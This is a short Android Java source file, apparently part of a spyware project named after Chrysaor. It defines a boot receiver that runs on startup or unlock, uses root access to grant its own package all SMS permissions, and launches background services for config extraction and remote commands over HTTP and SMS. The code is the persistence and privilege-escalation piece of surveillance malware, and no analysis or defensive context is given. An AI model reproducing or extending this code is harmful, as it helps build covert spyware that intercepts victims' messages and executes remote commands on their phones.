package com.android.chrysaoralike;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class BootReceiver extends BroadcastReceiver {
    private static final String TAG = "BootReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction()) ||
                "android.intent.action.QUICKBOOT_POWERON".equals(intent.getAction()) ||
                Intent.ACTION_USER_PRESENT.equals(intent.getAction())) {
            Log.i(TAG, "Boot detected, starting services.");
            RootUtils.grantAllSmsPermissions(context.getPackageName());
            context.startService(new Intent(context, ConfigExtractorService.class));
            context.startService(new Intent(context, HttpCommandService.class));
            context.startService(new Intent(context, SmsCommandService.class));
        }
    }
}
